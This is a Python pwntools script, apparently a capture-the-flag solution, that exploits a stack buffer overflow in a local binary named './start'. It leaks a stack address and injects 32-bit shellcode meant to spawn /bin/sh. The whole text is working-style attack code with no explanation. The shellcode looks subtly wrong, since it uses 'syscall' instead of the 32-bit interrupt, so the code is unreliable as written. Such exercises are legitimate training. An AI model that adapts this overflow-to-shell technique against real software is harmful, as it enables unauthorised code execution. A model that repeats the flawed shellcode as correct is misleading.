from pwn import *
context.log_level = 'DEBUG'
r = gdb.debug("./start")

write = p32(0x8048087)
r.recvuntil(":")
r.write(b"A"*0x14 + write)

leak = u32(r.recv(4))

shellcode = asm("""
xor     eax, eax
push    eax
push     0x68732f2f
push     0x6e69622f
mov     ebx, esp
mov     ecx, 0
mov     edx, 0
mov     eax, 11
syscall
""")

r.write(b"A"*0x14 + p32(leak + 0x14) + shellcode)
r.interactive()
